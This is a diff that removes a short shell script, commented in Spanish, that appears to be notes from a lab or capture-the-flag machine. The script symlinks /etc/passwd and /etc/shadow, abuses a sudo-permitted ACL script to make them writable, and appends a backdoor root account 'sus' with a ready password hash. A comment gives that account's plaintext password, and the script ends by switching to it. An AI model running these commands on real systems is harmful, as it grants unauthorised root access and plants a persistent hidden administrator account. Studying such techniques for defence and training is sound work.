@@ -1,9 +1,0 @@
-#Si se tiene acceso a ln y con permiso de ejecucion (sudo -l) con escritura;
-#
-#ls -s /etc/passwd OUTPUT-LINK && sudo (en este caso, un script que permite dar permiso de escritura al archivo. "acl.sh" (es un archivo hecho temporal sin replica)).
-ln -s /etc/passwd /home/mtz/pass && sudo /opt/acl.sh mtz rw /home/mtz/pass
-ln -s /etc/shadow /home/mtz/contra && sudo /opt/acl.sh mtz rw /home/mtz/contra
-echo "sus:x:0:0:sus:/root:/bin/bash" >> ./pass
-echo "sus:$y$j9T$RUjBgvOODKC9hyu5u7zCt0$Vf7nqZ4umh3s1N69EeoQ4N5zoid6c2SlGb1LvBFRxSB:19742:0:99999:7:::" >> ./contra
-#contraseña: 03F6lY3uXAP2bkW8
-su sus
